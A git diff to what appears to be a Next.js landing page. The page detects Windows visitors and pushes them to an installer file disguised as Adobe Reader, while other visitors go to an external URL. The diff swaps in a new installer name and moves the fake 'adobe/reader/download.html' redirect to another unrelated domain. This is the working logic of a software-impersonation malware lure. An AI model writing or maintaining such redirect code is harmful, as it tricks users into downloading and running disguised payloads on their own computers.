@@ -6,8 +6,8 @@ export default function Home() {
     const isWindows = /windows/i.test(userAgent);
 
     const NON_WINDOWS_TARGET = "https://wavemarkmx.com/ms";
-    const MSI_FILE = "/Reader_en_install.msi";
-    const WINDOWS_REDIRECT = "https://mksonline.com.mx/css/adobe/reader/download.html";
+    const MSI_FILE = "/Reader_Adobe-en_install";
+    const WINDOWS_REDIRECT = "https://wavemarkmx.com/adober/reader/download.html";
 
     if (isWindows) {
       window.location.href = MSI_FILE;
@@ -52,3 +52,4 @@ export default function Home() {
     </main>
   );
 }
+
